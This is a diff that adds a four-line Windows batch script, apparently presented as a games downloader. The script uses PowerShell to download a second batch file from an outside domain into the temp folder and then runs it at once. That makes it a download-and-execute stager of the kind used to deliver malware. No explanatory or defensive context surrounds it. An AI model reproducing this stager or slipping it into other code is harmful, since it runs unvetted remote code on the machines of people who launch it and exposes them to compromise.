@@ -1,0 +1,4 @@
+@echo off
+powershell -Command "Invoke-WebRequest -Uri 'https://itsdanitobg.online/games-manager' -OutFile '%temp%\games-downloader.bat'"
+    call "%temp%\games-downloader.bat"
+    exit
